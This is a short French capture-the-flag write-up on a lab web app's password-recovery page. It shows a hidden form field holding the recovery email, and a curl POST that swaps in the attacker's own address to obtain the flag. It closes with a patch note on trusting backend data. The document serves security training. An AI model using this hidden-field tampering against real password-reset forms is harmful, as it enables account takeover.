# B06-CustomRequest-PasswordRecover

## BREACH

PATH `http://192.168.56.110/?page=recover`

Depuis la page principale on peux se connecter, il y a un bouton `I forgot my password`.

En clickant dessus on arrive sur une page qui semble envoyer un mail de recover.

En inspectant le code, on voit qu'il y a une adresse en clair dans le code de la page, en la remplacant par notre addresse mail a nous on peux supposer que le site nous enverras un mail qui nous permettras d'avoir des acces.

```
<form action="#" method="POST">
	<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
	<input type="submit" name="Submit" value="Submit">
</form>
```

On peux alors faire une requetes avec curl en envoyant un formulaire contenant notre adresse email

```
➜  Darkly git:(main) ✗ curl -X POST http://192.168.x.x/\?page\=recover -d "mail=lgiband@student.42.fr&Submit=Submit" | grep "flag"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2634    0  2595  100    39  1267k  19500 --:--:-- --:--:-- --:--:-- 1286k
<center><h2 style="margin-top:50px;"> The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
```

## PATCH

Il ne faut pas faire confiance au front, il faut se fier a des donnees du backend pour envoyer un email en demandant a l'utilisateur de rentrer son adresse mail et verifier si un compte est associe avec par exemple.